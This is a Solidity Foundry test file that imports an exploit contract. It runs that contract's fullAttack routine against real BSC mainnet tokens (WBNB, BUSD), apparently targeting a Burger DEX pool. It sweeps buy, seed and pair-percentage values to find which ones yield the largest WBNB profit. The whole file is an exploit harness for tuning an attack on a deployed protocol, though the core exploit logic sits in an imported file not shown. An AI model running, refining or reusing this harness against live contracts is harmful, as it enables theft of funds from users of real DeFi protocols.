// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "./BurgerMultiTest4.t.sol";

contract BurgerMultiTest10 is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;

    function _tryAttack(uint256 buyAmt, uint256 seedAmt, uint256 pairPct) internal returns (int256) {
        address att = makeAddr(string(abi.encodePacked("a", buyAmt, seedAmt, pairPct)));
        vm.deal(att, 5000 ether);
        vm.startPrank(att);

        BurgerMultiExploit4 e = new BurgerMultiExploit4();
        IWBNB(WBNB).deposit{value: 3000 ether}();
        IWBNB(WBNB).transfer(address(e), 3000 ether);

        uint256 wbnbBefore = IWBNB(WBNB).balanceOf(address(e));

        try e.fullAttack(BUSD, buyAmt, seedAmt, pairPct) {
            uint256 wbnbAfter = IWBNB(WBNB).balanceOf(address(e));
            vm.stopPrank();
            return int256(wbnbAfter) - int256(wbnbBefore);
        } catch {
            vm.stopPrank();
            return type(int256).min;
        }
    }

    // Focus: buy=300, seed=20, high pct values
    function test_high_pct() public {
        uint256[8] memory pcts = [uint256(45), 50, 55, 60, 65, 70, 75, 80];
        for (uint p = 0; p < pcts.length; p++) {
            int256 delta = _tryAttack(300 ether, 20 ether, pcts[p]);
            emit log_named_uint("pct", pcts[p]);
            emit log_named_int("delta", delta);
        }
    }

    // Also test buy=200 seed=20 with high pct
    function test_buy200() public {
        uint256[6] memory pcts = [uint256(50), 60, 70, 80, 85, 90];
        for (uint p = 0; p < pcts.length; p++) {
            int256 delta = _tryAttack(200 ether, 20 ether, pcts[p]);
            emit log_named_uint("pct_200", pcts[p]);
            emit log_named_int("delta_200", delta);
        }
    }

    // And buy=500 seed=20 with moderate pct
    function test_buy500() public {
        uint256[6] memory pcts = [uint256(20), 30, 40, 50, 60, 70];
        for (uint p = 0; p < pcts.length; p++) {
            int256 delta = _tryAttack(500 ether, 20 ether, pcts[p]);
            emit log_named_uint("pct_500", pcts[p]);
            emit log_named_int("delta_500", delta);
        }
    }
}
